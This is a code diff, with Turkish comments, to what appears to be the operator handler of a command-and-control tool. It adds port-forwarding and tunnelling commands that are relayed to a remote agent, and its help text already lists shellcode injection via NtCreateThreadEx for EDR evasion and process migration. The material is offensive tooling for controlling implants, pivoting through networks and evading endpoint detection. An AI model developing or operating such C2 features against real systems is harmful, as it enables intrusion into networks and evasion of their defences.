@@ -311,6 +311,12 @@ class Handler(BaseHandler):
   inject_shellcode_nt <PID> <file>    - NtCreateThreadEx ile enjeksiyon (EDR atlatma)
   inject_migrate <PID> [file]         - Hedef process'e migrate et (opsiyonel shellcode)
 
+[Port Forwarding (Tünelleme)]
+  portfwd add <port> <host> <port>    - Yeni port forwarding tüneli başlat
+  portfwd list                        - Aktif tünelleri listele
+  portfwd del <id>                    - Tüneli kaldır
+  portfwd stop                        - Tüm tünelleri durdur
+
 ═══════════════════════════════════════════════════════════════════
 """
                     print(help_text)
@@ -433,6 +439,17 @@ class Handler(BaseHandler):
                     except Exception as e:
                         print(f"[!] Upload hazırlık hatası: {str(e)}")
                         continue
+
+                # Port Forwarding işlemleri (Handler yakalar ve ajana gönderir)
+                if cmd_lower.startswith("portfwd "):
+                    if len(cmd_lower.split()) < 2:
+                        print("[!] Kullanım: portfwd <add|list|del|stop>")
+                        continue
+                    # Ajan tarafında çalışması için sadece yönlendir
+                    self.send_data(cmd)
+                    response = self.recv_data()
+                    print(response)
+                    continue
 
                 # Komutu gönder
                 self.send_data(cmd)
